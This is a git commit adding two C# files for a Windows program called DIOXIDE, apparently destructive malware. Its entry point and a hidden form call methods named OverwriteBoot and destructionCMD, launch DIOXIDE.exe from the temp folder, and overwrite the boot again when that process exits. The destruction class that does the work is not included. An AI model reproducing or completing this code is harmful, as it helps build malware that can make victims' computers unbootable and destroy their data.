bb561928367bf3b57bcf1b213c877d8e0bcec45f
Mist <59188378+Mist0090@users.noreply.github.com>
2021-12-17 17:34:12 +0900

    Add files via upload

---
+++ run_Dioxide/Program.cs
@@ -0,0 +1,24 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace DIOXIDE
+{
+    static class Program
+    {
+        /// <summary>
+        /// アプリケーションのメイン エントリ ポイントです。
+        /// </summary>
+        [STAThread]
+        static void Main()
+        {
+            destruction destruction = new destruction();
+            destruction.WARNING();
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            Application.Run(new WatchProcess());
+        }
+    }
+}
---
+++ run_Dioxide/WatchProcess.cs
@@ -0,0 +1,38 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace DIOXIDE
+{
+    public partial class WatchProcess : Form
+    {
+        public WatchProcess()
+        {
+            InitializeComponent();
+        }
+
+        private void WatchProcess_Load(object sender, EventArgs e)
+        {
+            destruction destruction = new destruction();
+            destruction.OverwriteBoot();
+            Task.Run(destruction.destructionCMD);
+            string temppath = System.IO.Path.GetTempPath();
+            System.Diagnostics.Process hProcess = System.Diagnostics.Process.Start(temppath + "\\" + "DIOXIDE.exe");
+            hProcess.EnableRaisingEvents = true;
+            hProcess.Exited += new System.EventHandler(Mistake4_Exited);
+            this.Hide();
+        }
+        private void Mistake4_Exited(object sender, System.EventArgs e)
+        {
+            destruction destruction = new destruction();
+            destruction.OverwriteBoot();
+            destruction.Exit();
+        }
+    }
+}
